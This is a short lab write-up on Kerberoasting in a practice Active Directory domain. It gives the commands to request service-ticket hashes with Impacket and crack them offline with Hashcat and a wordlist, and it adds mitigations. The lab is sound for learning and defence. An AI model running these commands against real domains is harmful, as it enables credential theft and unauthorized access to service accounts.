# Kerberoasting Attack – Active Directory Lab

## Overview

Kerberoasting is a technique used in Active Directory to request Kerberos service tickets (TGS) for service accounts and crack them offline.

---

## Objective

- Enumerate SPNs
- Request TGS ticket
- Extract hash
- Crack using Hashcat

---

## Lab Environment

- Kali Linux
- Active Directory
- Domain: MARVEL.local

Tools:

- Impacket
- Hashcat

---

## Step 1 - Get SPNs

Command:
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -request

Purpose:

- Finds SPNs
- Requests ticket
- Outputs hash

---

## Step 2 - Save Hash

Command:
nano krb.txt

Paste:
$krb5tgs$23$\*...

---

## Step 3 - Crack Hash

Command:
hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt

Rule:
hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule

---

## Result

- Service account found
- Hash extracted
- Hash cracked

Password hidden intentionally.

---

## Why Important

- No admin needed
- Offline attack
- Weak passwords risk

---

## Mitigation

- Strong passwords
- Rotation
- Least privilege
- Monitor Kerberos

---

## What I Learned

- SPN enumeration
- Hash extraction
- Offline cracking

---

## Ethical Note

For learning purposes only.
